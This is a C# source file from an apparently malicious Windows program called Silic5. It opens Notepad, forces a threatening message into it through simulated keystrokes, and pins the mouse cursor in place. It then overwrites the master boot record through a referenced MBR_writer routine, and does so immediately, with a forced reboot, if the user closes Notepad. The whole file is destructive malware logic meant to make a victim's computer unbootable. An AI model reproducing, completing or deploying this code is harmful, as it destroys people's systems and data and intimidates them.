using Silic5;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Silic5
{
    public class short_message
    {
        public void story()
        {
            var mbr_h = new mbr_kill();
            Thread.Sleep(5000);
            string text = "Welcome Back to your final moment. " +
            "You cannot escape from me, " +
            "Enjoy your last minutes " +
            "Good Luck.";
            char[] Mychars = text.ToCharArray();
            Process.Start(@"C:\Windows\notepad.exe");
            Process[] proces_name = Process.GetProcessesByName("notepad");
            while (proces_name.Length == 0) { }
            Thread.Sleep(1000);
            Thread th_spam = new Thread(mouse_spam);
            th_spam.Start();
            int x = Screen.PrimaryScreen.Bounds.Width; int y = Screen.PrimaryScreen.Bounds.Height;
            for (int num = 0; num < Mychars.Length; num++)
            {
                IntPtr find_win = Dll_Imports.FindWindow("Notepad", null);
                if (find_win == IntPtr.Zero)
                {
                    mbr_h.MBR_writer();
                    RebootHelper.ForceRebootComputer();
                    break;
                }
                    try
                    {
                    Dll_Imports.MoveWindow(find_win, 50, 50, x / 3, y / 3, true);
                    Dll_Imports.SetActiveWindow(find_win);
                    Dll_Imports.SetForegroundWindow(find_win);
                    UInt16 uniCode = Mychars[num];
                        Dll_Imports.INPUT[] input = new Dll_Imports.INPUT[2];
                        input[0].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                        input[0].U.ki.wScan = (Dll_Imports.ScanCodeShort)uniCode;
                        input[0].U.ki.dwFlags = Dll_Imports.KEYEVENTF.UNICODE;
                        input[1].type = Dll_Imports.InputType.INPUT_KEYBOARD;
                        input[1].U.ki.wVk = Dll_Imports.VirtualKeyShort.RETURN;
                        if (Mychars[num] != '!')
                            Dll_Imports.SendInput(1, input, Marshal.SizeOf(typeof(Dll_Imports.INPUT)));
                        else
                            Dll_Imports.SendInput(2, input, Marshal.SizeOf(typeof(Dll_Imports.INPUT)));
                    }
                    catch
                    {
                    break;
                }
                Thread.Sleep(100);
            }
            Thread.Sleep(1000);
            foreach (Process proces_n in proces_name) { proces_n.Kill(); }
            var timer_h = new payload_timer();
            Thread th_timer = new Thread(timer_h.timer);
            th_timer.Start();
            mbr_h.MBR_writer();

        }
        public void mouse_spam()
        {
            Process[] proces_name = Process.GetProcessesByName("notepad");
            while (proces_name.Length == 1)
            {
                proces_name = Process.GetProcessesByName("notepad");
                Dll_Imports.SetCursorPos(50, 50);
                Dll_Imports.mouse_event(Dll_Imports.MOUSEEVENTF_LEFTUP, 50, 50, 0, UIntPtr.Zero);
                Thread.Sleep(1);
            }
        }
    }
}
